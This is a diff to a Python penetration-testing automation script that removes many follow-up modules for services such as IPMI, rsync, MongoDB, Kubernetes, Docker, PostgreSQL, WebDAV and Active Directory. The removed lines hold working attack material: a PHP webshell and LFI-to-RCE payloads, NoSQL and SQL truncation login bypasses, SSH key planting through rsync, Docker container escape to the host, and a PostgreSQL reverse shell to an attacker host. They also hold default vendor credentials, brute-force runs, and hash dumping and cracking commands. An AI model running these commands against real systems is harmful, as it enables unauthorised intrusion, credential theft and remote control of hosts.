@@ -13,22 +13,6 @@ Changes from v5 → v6:
 
   RECON ADDITIONS (gap list items 1-2)
   - follow_up_vhost()     — ffuf Host-header vhost fuzzing (VHOST-ENUM)
-
-  SPELLBOOK INTEGRATION (v6.1 — from rusted-silver.github.io/spellbook):
-  - follow_up_ipmi()       — IPMI NSE + MSF hash dump, default creds table
-  - follow_up_rsync()      — nc probe, module list, anon download, writable plant
-  - follow_up_mongodb()    — NSE mongodb-info + mongosh DB/collection enum
-  - follow_up_nats()       — natscli stream listing, monitoring varz/subsz
-  - follow_up_imap()       — IMAP NSE + openssl/curl/nc connection hints
-  - follow_up_kubernetes() — kubeletctl pods/rce scan + curl kubelet API
-  - follow_up_docker_api() — Docker remote TCP API enum + container escape
-  - follow_up_bloodhound() — bloodhound-python ALL collection + import hints
-  - follow_up_timeroast()  — nxc timeroast module + hashcat -m 31300
-  - service_follow_up() router: IPMI/623, Rsync/873, MongoDB/27017,
-    NATS/4222, IMAP/143+993, K8s/10250+6443, Docker/2375+2376
-  - UDP_CRITICAL_PORTS: added 623 (IPMI)
-  - AD scan: Timeroasting auto-prompted, BloodHound optional with creds
-  - print_tool_banner: +mongosh, +kubeletctl, +rustscan, +certipy, +bloodyad
   - follow_up_git()       — git-dumper + truffleHog .git exposure check
   - follow_up_exiftool()  — exiftool metadata extraction from discovered files
   - searchsploit_banners()— auto searchsploit all product/version banners from XML
@@ -203,20 +187,6 @@ def print_tool_banner() -> None:
         ("evil-winrm",      "WinRM shell"),
         ("impacket-GetNPUsers", "ASREPRoast"),
         ("impacket-GetUserSPNs","Kerberoast"),
-        ("bloodhound-python",   "BloodHound collection"),
-        ("mongosh",             "MongoDB enum"),
-        ("kubeletctl",          "Kubernetes enum"),
-        ("rustscan",            "Fast port scan"),
-        ("certipy",             "ADCS / shadow creds"),
-        ("bloodyad",            "ACL/ACE abuse"),
-        ("davtest",             "WebDAV extension test"),
-        ("cadaver",             "WebDAV interactive client"),
-        ("keepass2john",        "KeePass hash extraction"),
-        ("cupp",                "Target wordlist generator"),
-        ("crunch",              "Pattern wordlist generator"),
-        ("swaks",               "SMTP test/phishing tool"),
-        ("wfuzz",               "Web fuzzer alternative"),
-        ("psql",                "PostgreSQL client"),
     ]
     print("\n[+] Tool availability:")
     for name, purpose in tools:
@@ -604,7 +574,7 @@ def print_triage_list(ranked: List[Dict], output_md: Optional[Path] = None) -> N
 # NSE helpers
 # ─────────────────────────────────────────────
 
-UDP_CRITICAL_PORTS = "53,69,111,123,137,138,161,162,500,623,1194,1900,2049,5353"
+UDP_CRITICAL_PORTS = "53,69,111,123,137,138,161,162,500,1194,1900,2049,5353"
 NSE_DEFAULT  = "default"
 NSE_SMB      = ("smb-security-mode,smb2-security-mode,smb-os-discovery,"
                 "smb-vuln-ms17-010,smb-enum-shares,smb-vuln-cve2009-3103")
@@ -913,46 +883,6 @@ def follow_up_http(ip: str, port: str, svc: str, out_dir: Path, log_file: Option
     print(f"    {url}/profile?id=1  →  try id=2,3,100...")
     print(f"    {url}/document?doc_id=1  →  iterate doc_id")
 
-    # PHP Filter Chain Generator (no file needed for LFI→RCE)
-    print(f"\n  [TIP] PHP filter chain RCE (LFI without log/session file):")
-    print(f"    git clone https://github.com/synacktiv/php_filter_chain_generator")
-    print(f"    python3 php_filter_chain_generator.py --chain '<?php system($_GET[\"cmd\"]); ?>'")
-    print(f"    # Use output as ?page=<chain>&cmd=id")
-
-    # Phar / zip LFI wrappers (from n0xturne repo)
-    print(f"\n  [TIP] Phar/zip LFI wrappers:")
-    print(f"    # zip wrapper:")
-    print(f"    echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php && zip shell.jpg shell.php")
-    print(f"    curl '{url}/index.php?page=zip://shell.jpg%23shell&cmd=id'")
-    print(f"    # phar wrapper (compile phar.php then):")
-    print(f"    curl '{url}/index.php?page=phar://./uploads/shell.jpg/shell&cmd=id'")
-
-    # NoSQL injection hints (MongoDB apps)
-    print(f"\n  [TIP] NoSQL injection (if MongoDB backend):")
-    print(f"    POST body: {{\"username\": {{\"$ne\": null}}, \"password\": {{\"$ne\": null}}}}")
-    print(f"    URL params: username[$ne]=invalid&password[$ne]=invalid")
-    print(f"    Regex enum: {{\"username\": {{\"$regex\": \"^a\"}}, \"password\": {{\"$ne\": null}}}}")
-
-    # SQL Truncation (from n0xturne repo)
-    print(f"\n  [TIP] SQL Truncation attack (register 'admin     x' → stored as 'admin'):")
-    print(f"    Username: 'admin          ' (spaces to exceed column length)")
-    print(f"    → backend truncates to 'admin' → login with attacker-set password")
-
-    # WebDAV probe
-    if have_bin("davtest"):
-        run_streaming_command(
-            ["davtest", "-url", url],
-            label=f"WEB davtest {ip}:{port}",
-            combined_log=log_file, timeout_seconds=60)
-    else:
-        run_streaming_command(
-            ["nmap", "-p", port, "--script", "http-webdav-scan", ip],
-            label=f"WEB WebDAV NSE {ip}:{port}",
-            combined_log=log_file, timeout_seconds=30)
-        print(f"  [TIP] WebDAV client: apt install cadaver davtest")
-        print(f"    cadaver {url}/webdav/   # interactive upload")
-        print(f"    davtest -url {url}       # test executable extensions")
-
 
 def follow_up_smb(ip: str, out_dir: Path, log_file: Optional[Path]) -> None:
     if have_bin("smbclient"):
@@ -970,10 +900,6 @@ def follow_up_smb(ip: str, out_dir: Path, log_file: Optional[Path]) -> None:
                               combined_log=log_file, timeout_seconds=FOLLOW_UP_TIMEOUT)
         run_streaming_command([cme, "smb", ip, "-u", "guest", "-p", ""],
                               label=f"SMB {cme} guest {ip}",
-                              combined_log=log_file, timeout_seconds=60)
-        # GPP/SYSVOL check — look for cpassword in Group Policy Preferences
-        run_streaming_command([cme, "smb", ip, "-u", "", "-p", "", "-M", "gpp_password"],
-                              label=f"SMB GPP null session {ip}",
                               combined_log=log_file, timeout_seconds=60)
 
 
@@ -1166,314 +1092,6 @@ def follow_up_exiftool(workspace: Path, log_file: Optional[Path]) -> None:
             label=f"exiftool {f.name}", combined_log=log_file, timeout_seconds=30)
 
 
-# NEW: IPMI hash capture (spellbook: 623 UDP IPMI)
-def follow_up_ipmi(ip: str, log_file: Optional[Path]) -> None:
-    run_streaming_command(
-        ["nmap", "-sU", "--script", "ipmi-version,ipmi-brute", "-p", "623", ip],
-        label=f"IPMI NSE {ip}", combined_log=log_file, timeout_seconds=FOLLOW_UP_TIMEOUT)
-    print(f"\n  [TIP] IPMI hash dump via MSF:")
-    print(f"    msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS {ip}; run'")
-    print(f"  [TIP] Default creds: Dell iDRAC root/calvin | HP iLO Administrator/<random8> | Supermicro ADMIN/ADMIN")
-    print(f"  [TIP] Crack with: hashcat -m 7300 hashes.txt /usr/share/wordlists/rockyou.txt")
-
-
-# NEW: Rsync anonymous enumeration (spellbook: 873 TCP Rsync)
-def follow_up_rsync(ip: str, port: str, out_dir: Path, log_file: Optional[Path]) -> None:
-    run_streaming_command(
-        ["nmap", "-sV", "-p", port, "--script", "rsync-list-modules", ip],
-        label=f"Rsync NSE {ip}:{port}", combined_log=log_file, timeout_seconds=60)
-    # Probe with nc first to list banner
-    if have_bin("nc"):
-        run_streaming_command(
-            ["nc", "-nv", "-w", "3", ip, port],
-            label=f"Rsync nc probe {ip}:{port}", combined_log=log_file, timeout_seconds=15)
-    # List modules anonymously
-    run_streaming_command(
-        ["rsync", "--list-only", f"rsync://{ip}/"],
-        label=f"Rsync list modules {ip}", combined_log=log_file, timeout_seconds=60)
-    print(f"\n  [TIP] Download a module:")
-    print(f"    rsync -av rsync://{ip}/<MODULE>/ ./rsync_{ip}/")
-    print(f"  [TIP] If writable, plant SSH key:")
-    print(f"    rsync ~/.ssh/id_rsa.pub rsync://{ip}/<MODULE>/root/.ssh/authorized_keys")
-
-
-# NEW: MongoDB unauthenticated enum (spellbook: 27017 TCP MongoDB)
-def follow_up_mongodb(ip: str, port: str, log_file: Optional[Path]) -> None:
-    run_streaming_command(
-        ["nmap", "-sV", "-p", port, "--script", "mongodb-info,mongodb-databases", ip],
-        label=f"MongoDB NSE {ip}:{port}", combined_log=log_file, timeout_seconds=120)
-    if have_bin("mongosh"):
-        run_streaming_command(
-            ["mongosh", f"mongodb://{ip}:{port}", "--eval",
-             "db.adminCommand({listDatabases:1})"],
-            label=f"MongoDB list DBs {ip}:{port}", combined_log=log_file, timeout_seconds=60)
-    else:
-        print(f"\n  [TIP] Install mongosh:")
-        print(f"    wget https://downloads.mongodb.com/compass/mongodb-mongosh_2.5.10_amd64.deb")
-        print(f"    sudo dpkg -i ./mongodb-mongosh_*.deb")
-    print(f"\n  [TIP] Manual mongosh commands:")
-    print(f"    mongosh mongodb://{ip}:{port}")
-    print(f"    > show databases")
-    print(f"    > use <db>; show collections; db.<col>.find().pretty()")
-
-
-# NEW: NATS message bus enum (spellbook: 4222 TCP NATS)
-def follow_up_nats(ip: str, port: str, log_file: Optional[Path]) -> None:
-    run_streaming_command(
-        ["nmap", "-sV", "-p", port, ip],
-        label=f"NATS banner {ip}:{port}", combined_log=log_file, timeout_seconds=30)
-    # Check monitoring port
-    if have_bin("curl"):
-        run_streaming_command(
-            ["curl", "-s", f"http://{ip}:8222/varz"],
-            label=f"NATS varz {ip}", combined_log=log_file, timeout_seconds=20)
-        run_streaming_command(
-            ["curl", "-s", f"http://{ip}:8222/subsz"],
-            label=f"NATS subsz {ip}", combined_log=log_file, timeout_seconds=20)
-    print(f"\n  [TIP] Install natscli and enumerate:")
-    print(f"    go install github.com/nats-io/natscli/nats@latest")
-    print(f"    nats --server nats://{ip}:{port} stream ls")
-    print(f"    nats --server nats://{ip}:{port} sub '>'   # subscribe all subjects")
-
-
-# NEW: IMAP mail enumeration (spellbook: 143/993 TCP IMAP)
-def follow_up_imap(ip: str, port: str, log_file: Optional[Path]) -> None:
-    is_tls = port in {"993"}
-    run_streaming_command(
-        ["nmap", "-p", port, "--script", "imap-capabilities,imap-ntlm-info", ip],
-        label=f"IMAP NSE {ip}:{port}", combined_log=log_file, timeout_seconds=60)
-    if is_tls and have_bin("openssl"):
-        print(f"\n  [TIP] Connect to IMAP over TLS:")
-        print(f"    openssl s_client -connect {ip}:imaps")
-    else:
-        print(f"\n  [TIP] Connect to IMAP:")
-        print(f"    nc {ip} {port}")
-        print(f"    curl -k imap://{ip}/ --user user:pass -v")
-    print(f"  [TIP] Try default/recovered creds, look for mail containing passwords")
-    print(f"  [TIP] Use Evolution GUI for full mailbox browse: sudo apt install evolution")
-
-
-# NEW: Kubernetes kubelet enum (spellbook: 10250/6443)
-def follow_up_kubernetes(ip: str, port: str, log_file: Optional[Path]) -> None:
-    run_streaming_command(
-        ["nmap", "-sV", "-p", port, "--script", "http-title,ssl-cert", ip],
-        label=f"K8s NSE {ip}:{port}", combined_log=log_file, timeout_seconds=60)
-    if have_bin("curl"):
-        run_streaming_command(
-            ["curl", "-sk", f"https://{ip}:{port}/pods"],
-            label=f"K8s pods {ip}:{port}", combined_log=log_file, timeout_seconds=30)
-        run_streaming_command(
-            ["curl", "-sk", f"https://{ip}:{port}/runningpods/"],
-            label=f"K8s runningpods {ip}:{port}", combined_log=log_file, timeout_seconds=30)
-    if have_bin("kubeletctl"):
-        run_streaming_command(
-            ["kubeletctl", "-i", "--server", ip, "pods"],
-            label=f"K8s kubeletctl pods {ip}", combined_log=log_file, timeout_seconds=60)
-        run_streaming_command(
-            ["kubeletctl", "-i", "--server", ip, "scan", "rce"],
-            label=f"K8s kubeletctl scan rce {ip}", combined_log=log_file, timeout_seconds=60)
-    else:
-        print(f"  [TIP] Install kubeletctl:")
-        print(f"    wget https://github.com/cyberark/kubeletctl/releases/latest/download/kubeletctl_linux_amd64")
-        print(f"    chmod +x kubeletctl_linux_amd64 && mv kubeletctl_linux_amd64 /usr/local/bin/kubeletctl")
-
-
-# NEW: Docker unauthenticated API (spellbook: 2375/2376)
-def follow_up_docker_api(ip: str, port: str, log_file: Optional[Path]) -> None:
-    if have_bin("curl"):
-        run_streaming_command(
-            ["curl", "-s", f"http://{ip}:{port}/version"],
-            label=f"Docker API version {ip}:{port}", combined_log=log_file, timeout_seconds=20)
-        run_streaming_command(
-            ["curl", "-s", f"http://{ip}:{port}/containers/json"],
-            label=f"Docker API containers {ip}:{port}", combined_log=log_file, timeout_seconds=20)
-    if have_bin("docker"):
-        run_streaming_command(
-            ["docker", "-H", f"tcp://{ip}:{port}", "ps"],
-            label=f"Docker remote ps {ip}:{port}", combined_log=log_file, timeout_seconds=30)
-        run_streaming_command(
-            ["docker", "-H", f"tcp://{ip}:{port}", "images"],
-            label=f"Docker remote images {ip}:{port}", combined_log=log_file, timeout_seconds=30)
-    print(f"\n  [TIP] Escape to host via privileged container:")
-    print(f"    docker -H tcp://{ip}:{port} run --rm -d --privileged -v /:/hostsystem alpine")
-    print(f"    docker -H tcp://{ip}:{port} exec -it <ID> chroot /hostsystem sh")
-
-
-# NEW: BloodHound collection trigger (after AD creds confirmed)
-def follow_up_bloodhound(ip: str, domain: str, user: str, password: str,
-                          workspace: Path, log_file: Optional[Path]) -> None:
-    bh_out = workspace / "bloodhound"
-    bh_out.mkdir(exist_ok=True)
-    if have_bin("bloodhound-python"):
-        run_streaming_command(
-            ["bloodhound-python", "-c", "ALL",
-             "-ns", ip, "-u", user, "-p", password,
-             "-d", domain, "--zip", "-o", str(bh_out)],
-            label=f"BloodHound collection {domain}", combined_log=log_file,
-            timeout_seconds=300)
-        print(f"\n  [+] BloodHound data in: {bh_out}")
-        print(f"  [TIP] Import zip into BloodHound neo4j then run:")
-        print(f"    'Shortest Paths to Domain Admins from Owned Principals'")
-        print(f"    'Find all Kerberoastable Users'")
-        print(f"    'Find AS-REP Roastable Users'")
-    else:
-        print(f"  [TIP] Install bloodhound-python: pip3 install bloodhound")
-        print(f"  [TIP] Then run:")
-        print(f"    bloodhound-python -c ALL -ns {ip} -u {user} -p {password} -d {domain} --zip")
-
-
-# NEW: Timeroasting (spellbook: nxc timeroast module)
-def follow_up_timeroast(ip: str, log_file: Optional[Path]) -> None:
-    cme = "netexec" if have_bin("netexec") else ("crackmapexec" if have_bin("crackmapexec") else None)
-    if cme:
-        run_streaming_command(
-            [cme, "smb", ip, "-M", "timeroast"],
-            label=f"Timeroast {ip}", combined_log=log_file, timeout_seconds=FOLLOW_UP_TIMEOUT)
-        print(f"\n  [TIP] Crack timeroast hashes:")
-        print(f"    hashcat -a 0 -m 31300 --user ./hashes /usr/share/wordlists/rockyou.txt")
-    else:
-        print(f"  [TIP] netexec/crackmapexec required for timeroasting.")
-
-
-# NEW: PostgreSQL enumeration and RCE check (GitHub repos research)
-def follow_up_postgres(ip: str, port: str, log_file: Optional[Path]) -> None:
-    run_streaming_command(
-        ["nmap", "-p", port, "--script",
-         "pgsql-brute,postgresql-info", ip],
-        label=f"PostgreSQL NSE {ip}:{port}",
-        combined_log=log_file, timeout_seconds=FOLLOW_UP_TIMEOUT)
-    print(f"\n  [TIP] Connect to PostgreSQL:")
-    print(f"    psql -U postgres -h {ip} -p {port}")
-    print(f"    psql -U postgres -h {ip} -p {port} -c '\\l'   # list databases")
-    print(f"\n  [TIP] Check privilege and RCE:")
-    print(f"    SELECT current_user;")
-    print(f"    SELECT rolname FROM pg_roles WHERE rolsuper='t';")
-    print(f"    CREATE TABLE cmd(output text);")
-    print(f"    COPY cmd FROM PROGRAM 'id';")
-    print(f"    SELECT * FROM cmd;")
-    print(f"\n  [TIP] Reverse shell via COPY FROM PROGRAM:")
-    print(f"    COPY cmd FROM PROGRAM 'bash -i >& /dev/tcp/<KALI>/443 0>&1';")
-    print(f"\n  [TIP] Check pg_hba.conf for trust auth:")
-    print(f"    COPY cmd FROM PROGRAM 'cat /etc/postgresql/*/main/pg_hba.conf';")
-    if have_bin("hydra"):
-        run_streaming_command(
-            ["hydra", "-l", "postgres", "-P",
-             "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt",
-             "-s", port, ip, "postgres"],
-            label=f"PostgreSQL hydra {ip}:{port}",
-            combined_log=log_file, timeout_seconds=120)
-
-
-# NEW: Memcached unauthenticated enumeration
-def follow_up_memcached(ip: str, port: str, log_file: Optional[Path]) -> None:
-    run_streaming_command(
-        ["nmap", "-p", port, "--script", "memcached-info", ip],
-        label=f"Memcached NSE {ip}:{port}",
-        combined_log=log_file, timeout_seconds=60)
-    print(f"\n  [TIP] Manual memcached dump:")
-    print(f"    telnet {ip} {port}")
-    print(f"    stats")
-    print(f"    stats items")
-    print(f"    stats cachedump <slab_id> 0")
-    print(f"    get <key>")
-    print(f"\n  [TIP] Python one-liner dump all keys:")
-    print(f"    python3 -c \"import socket; s=socket.socket(); s.connect(('{ip}',{port})); "
-          f"s.send(b'stats items\\r\\n'); print(s.recv(4096).decode())\"")
-
-
-# NEW: GPP/SYSVOL credential hunting (from multiple GitHub repos)
-def follow_up_gpp(ip: str, log_file: Optional[Path]) -> None:
-    """Check SYSVOL for Group Policy Preferences cpassword."""
-    cme = "netexec" if have_bin("netexec") else ("crackmapexec" if have_bin("crackmapexec") else None)
-    if cme:
-        run_streaming_command(
-            [cme, "smb", ip, "-u", "", "-p", "", "-M", "gpp_password"],
-            label=f"GPP null session {ip}",
-            combined_log=log_file, timeout_seconds=60)
-    # Also try authenticated if creds in store
-    if CRED_STORE:
-        for cred in list(CRED_STORE)[:2]:
-            if cred.cred_type not in ("anonymous", "no-auth") and cme:
-                run_streaming_command(
-                    [cme, "smb", ip, "-u", cred.username, "-p", cred.secret,
-                     "-M", "gpp_password"],
-                    label=f"GPP authed {cred.username}@{ip}",
-                    combined_log=log_file, timeout_seconds=60)
-    print(f"\n  [TIP] Manual SYSVOL search:")
-    print(f"    smbclient //{ip}/SYSVOL -N")
-    print(f"    # then: recurse ON; mget *.xml")
-    print(f"    grep -inr 'cpassword' ./sysvol/")
-    print(f"    gpp-decrypt '<cpassword_value>'")
-    if have_bin("impacket-Get-GPPPassword"):
-        run_streaming_command(
-            ["impacket-Get-GPPPassword", "-no-pass", ip],
-            label=f"GPP impacket {ip}",
-            combined_log=log_file, timeout_seconds=60)
-
-
-# NEW: WebDAV enumeration (from GitHub repos - cadaver, davtest)
-def follow_up_webdav(ip: str, port: str, log_file: Optional[Path]) -> None:
-    url = f"http://{ip}:{port}" if port not in {"80", "443"} else f"http://{ip}"
-    run_streaming_command(
-        ["nmap", "-p", port, "--script", "http-webdav-scan,http-methods", ip],
-        label=f"WebDAV NSE {ip}:{port}",
-        combined_log=log_file, timeout_seconds=60)
-    if have_bin("davtest"):
-        run_streaming_command(
-            ["davtest", "-url", url],
-            label=f"davtest {url}",
-            combined_log=log_file, timeout_seconds=FOLLOW_UP_TIMEOUT)
-    else:
-        print(f"  [TIP] Install davtest: apt install davtest")
-    if have_bin("cadaver"):
-        print(f"\n  [TIP] Interactive WebDAV with cadaver:")
-        print(f"    cadaver {url}/webdav/")
-        print(f"    dav:/> put shell.asp")
-        print(f"    dav:/> ls")
-    else:
-        print(f"  [TIP] Install cadaver: apt install cadaver")
-    print(f"\n  [TIP] Upload via curl:")
-    print(f"    curl -X PUT {url}/webdav/shell.asp -d @shell.asp")
-    print(f"    curl -X MOVE {url}/webdav/shell.txt -H 'Destination: {url}/webdav/shell.asp'")
-
-
-# NEW: SVN repository enumeration
-def follow_up_svn(ip: str, port: str, log_file: Optional[Path]) -> None:
-    run_streaming_command(
-        ["nmap", "-p", port, "--script", "svn-brute,http-svn-enum", ip],
-        label=f"SVN NSE {ip}:{port}",
-        combined_log=log_file, timeout_seconds=60)
-    print(f"\n  [TIP] SVN enumeration:")
-    print(f"    svn ls svn://{ip}/")
-    print(f"    svn log svn://{ip}/<repo>")
-    print(f"    svn checkout svn://{ip}/<repo> /tmp/svn_checkout")
-
-
-# NEW: KeePass .kdbx file hunting
-def follow_up_keepass_hunt(workspace: Path, log_file: Optional[Path]) -> None:
-    """Search workspace for .kdbx files and print crack instructions."""
-    kdbx_files = list(workspace.rglob("*.kdbx"))
-    if not kdbx_files:
-        print("  [TIP] No .kdbx files in workspace. Manual search on target:")
-        print("    find / -name '*.kdbx' 2>/dev/null")
-        return
-    for kf in kdbx_files:
-        print(f"\n  [+] Found KeePass database: {kf}")
-        if have_bin("keepass2john"):
-            hash_file = workspace / f"{kf.stem}_keepass.hash"
-            run_streaming_command(
-                ["keepass2john", str(kf)],
-                label=f"keepass2john {kf.name}",
-                combined_log=log_file, timeout_seconds=30)
-            print(f"\n  Crack with:")
-            print(f"    keepass2john {kf} > {hash_file}")
-            print(f"    hashcat -m 13400 {hash_file} /usr/share/wordlists/rockyou.txt")
-            print(f"    john --format=KeePass --wordlist=/usr/share/wordlists/rockyou.txt {hash_file}")
-        else:
-            print(f"  [TIP] keepass2john not found: pip3 install keepass2john")
-            print(f"    or: john --format=KeePass --wordlist=rockyou.txt")
-
-
 def service_follow_up(parsed: Dict, workspace: Path, log_file: Optional[Path]) -> None:
     follow_dir = workspace / "follow_up"
     follow_dir.mkdir(exist_ok=True)
@@ -1529,28 +1147,6 @@ def service_follow_up(parsed: Dict, workspace: Path, log_file: Optional[Path]) -
                 follow_up_mysql(ip, port, log_file)
             elif svc in {"wsman", "winrm"} or port in {"5985", "5986"}:
                 follow_up_winrm(ip, port, log_file)
-            # ── NEW SERVICES FROM SPELLBOOK ──────────────────────────────
-            elif svc == "ipmi" or port == "623":
-                follow_up_ipmi(ip, log_file)
-            elif svc == "rsync" or port == "873":
-                follow_up_rsync(ip, port, follow_dir, log_file)
-            elif svc in {"mongod", "mongodb"} or port in {"27017", "27018", "27019"}:
-                follow_up_mongodb(ip, port, log_file)
-            elif svc == "nats" or port in {"4222", "8222"}:
-                follow_up_nats(ip, port, log_file)
-            elif svc == "imap" or port in {"143", "993"}:
-                follow_up_imap(ip, port, log_file)
-            elif port in {"10250", "10255", "6443"}:
-                follow_up_kubernetes(ip, port, log_file)
-            elif port in {"2375", "2376"}:
-                follow_up_docker_api(ip, port, log_file)
-            # ── NEW SERVICES FROM GITHUB REPO RESEARCH ───────────────────
-            elif svc == "postgresql" or port == "5432":
-                follow_up_postgres(ip, port, log_file)
-            elif svc == "memcache" or port == "11211":
-                follow_up_memcached(ip, port, log_file)
-            elif svc == "svn" or port == "3690":
-                follow_up_svn(ip, port, log_file)
 
 
 # ─────────────────────────────────────────────
@@ -1748,16 +1344,6 @@ def post_process(
     if yes_no("Hash cracking helper?", default=False):
         hash_crack_helper(workspace, log_file)
 
-    # KeePass file hunting
-    follow_up_keepass_hunt(workspace, log_file)
-
-    # Password mutation tips
-    print("\n[+] Password mutation tips (hashcat rules):")
-    print("    hashcat -m <mode> hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule")
-    print("    hashcat -m <mode> hashes.txt rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule")
-    print("    cupp -i   # generate target-specific wordlist interactively")
-    print("    crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o custom.txt")
-
     # Post-exploit helper
     all_ports = [p for h in parsed.get("hosts", []) for p in h["open_ports"]]
     high_conf  = [r for r in ranked if r["score"] >= 8]
@@ -1941,24 +1527,6 @@ def ad_scan() -> None:
                               label="AD null-session shares", combined_log=log_file, timeout_seconds=60)
         run_streaming_command([cme, "smb", target, "--users", "-u", "", "-p", ""],
                               label="AD null-session users", combined_log=log_file, timeout_seconds=60)
-
-    # Timeroasting — unauthenticated, run immediately
-    if yes_no("Run Timeroasting (unauthenticated computer account hashes)?", default=True):
-        follow_up_timeroast(target, log_file)
-
-    # GPP/SYSVOL — unauthenticated cpassword check
-    if yes_no("Check SYSVOL for GPP cpassword (null session)?", default=True):
-        follow_up_gpp(target, log_file)
-
-    # BloodHound collection — needs creds
-    if yes_no("Run BloodHound collection (requires valid domain creds)?", default=False):
-        bh_domain = input("  Domain (e.g. corp.local): ").strip()
-        bh_user   = input("  Username: ").strip()
-        bh_pwd    = input("  Password: ").strip()
-        if bh_domain and bh_user and bh_pwd:
-            bh_workspace = workspace / "bloodhound"
-            bh_workspace.mkdir(exist_ok=True)
-            follow_up_bloodhound(target, bh_domain, bh_user, bh_pwd, bh_workspace, log_file)
 
     # AD-specific follow-up hints
     print("\n" + "═" * 60)
